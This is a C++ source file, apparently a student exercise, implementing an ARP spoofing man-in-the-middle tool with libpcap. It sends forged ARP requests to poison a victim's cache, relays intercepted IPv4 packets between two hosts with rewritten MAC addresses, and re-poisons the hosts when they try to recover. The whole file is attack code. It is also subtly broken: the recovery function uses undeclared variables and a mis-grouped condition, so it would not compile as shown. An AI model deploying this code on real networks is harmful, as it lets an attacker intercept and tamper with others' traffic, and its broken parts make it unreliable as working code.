
#include <cstdio>
#include <stdlib.h>
#include <string.h>
#include <iostream>
#include <pcap.h>
#include "etharp.h"

struct IpHdr {
    uint8_t v_:4;           // version
    uint8_t hdr_len_:4;     // header_length
    uint8_t tos_val_;

    uint16_t tot_len_;      // total_length
    uint16_t id_val_;       // identification
    
    uint8_t flags_val_:3;
    uint16_t frag_offset_:13;

    uint8_t ttl_val_;
    uint8_t protocol_val_;
    uint16_t checksum_val_;
    
    Ip src_ip_;             // sip
    Ip dest_ip_;            // dip
};

struct IcmpHdr {
    uint8_t type_;
    uint8_t code_;
    uint16_t check_;
    uint16_t id_;
    uint16_t seq_;

};

#pragma pack(push, 1)
struct EthIpPacket final{
        EthHdr eth_;
        IpHdr ip_;
	IcmpHdr icmp_; 
};

// ARP 요청(감염) 보내는 function
void arpInfect(pcap_t *handle, Mac my_mac, Mac sender_mac, const char* sender_ip, const char* target_ip)
{
    EthArpPacket packet;

    packet.eth_.dmac_ = sender_mac;
    packet.eth_.smac_ = my_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request); //Reply가 아니라 Request로 감염시킨다.
    packet.arp_.smac_ = my_mac;
    packet.arp_.sip_ = htonl(Ip(target_ip));
    packet.arp_.tmac_ = sender_mac;
    packet.arp_.tip_ = htonl(Ip(sender_ip));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}

// IP패킷 Relay 해주는 function
void packetRelay(pcap_t *handle, Mac my_mac, Mac sender_mac, Mac target_mac, const char* sender_ip, const char* target_ip)
{
    struct pcap_pkthdr *header;
    const u_char *response;
    
    // Convert sender_ip and target_ip to Ip objects
    Ip senderIp(sender_ip);
    Ip targetIp(target_ip);

    // 패킷 검사
    while (true) {
        int pcap_next_res = pcap_next_ex(handle, &header, &response);
        if (pcap_next_res == 1) {
            EthIpPacket *recv_packet = (EthIpPacket *)response;
            
            // 받은 패킷이 IPv4 패킷인지 확인
            if (ntohs(recv_packet->eth_.type_) == EthHdr::Ip4) {
                // 수신된 패킷의 출발지 IP를 Ip 객체로 변환
                Ip srcIp = ntohl(recv_packet->ip_.src_ip_);
                
                // IP 주소가 senderIp와 일치하는지 확인
                if (srcIp == senderIp) {
                    fprintf(stderr,"I got spoofed packet\n");

                    // 출발지, 목적지 MAC 주소 변경
                    recv_packet->eth_.smac_ = my_mac;  // Mac 타입의 smac_에 my_mac 할당
                    recv_packet->eth_.dmac_ = target_mac;

                    // 수정된 패킷 전송
                    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(recv_packet), header->len);
                    if (res != 0) {
                        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                    }
                }
                // IP 주소가 targetIp와 일치하는지 확인
                else if (srcIp == targetIp) {
                    fprintf(stderr,"I got spoofed packet\n");

                    // 출발지, 목적지 MAC 주소 변경
                    recv_packet->eth_.smac_ = my_mac;  // Mac 타입의 smac_에 my_mac 할당
                    recv_packet->eth_.dmac_ = sender_mac;

                    // 수정된 패킷 전송
                    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(recv_packet), header->len);
                    if (res != 0) {
                        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                    }
                }
            }
        } 
        else if (pcap_next_res == -1 || pcap_next_res == -2) {
            fprintf(stderr, "Error or Timeout reading the response: %s\n", pcap_geterr(handle));
        }
    }
}

// Recovery 상황에서의 ARP Infect function
void recoveryCheck(pcap_t *handle, Mac my_mac, Mac sender_mac, Mac target_mac)
{
    struct pcap_pkthdr *header;
    const u_char *response;

    while (true) {
        int pcap_next_res = pcap_next_ex(handle, &header, &response);
    
        if (pcap_next_res == 1) {

            EthArpPacket *recv_packet = (EthArpPacket *)response; 
            
            /* 
            Case1: Sender의 브로드캐스트(ARP Req)
            Case2: Target의 브로드캐스트(ARP Req)
            Case3: Sender의 유니캐스트(ARP Req)
            Case4: Target의 유니캐스트(ARP Req)
            -> 4가지 Case의 공통점은 Arp Req패킷이라는 점과 smac이 sender의 Mac이거나 target의 Mac이라는 것이다.*/
            
            if (ntohs(recv_packet->eth_.type_) == EthHdr::Arp && ntohs(packet.arp_.op_)== ArpHdr::Request && 
            (recv_packet->eth_.smac_ == sender_mac) || (recv_packet->eth_.smac_ == target_mac)){
                fprintf(stderr, "Detect ARP Recovery");
                arpInfect(handle, my_mac,sender_mac, sender_ip, target_ip);
                arpInfect(handle, my_mac,target_mac, target_ip, sender_ip);
            }
        }

        else if (pcap_next_res == -1 || pcap_next_res == -2) {
            fprintf(stderr, "Error or Timeout reading the response: %s\n", pcap_geterr(handle));
            }
    }     
}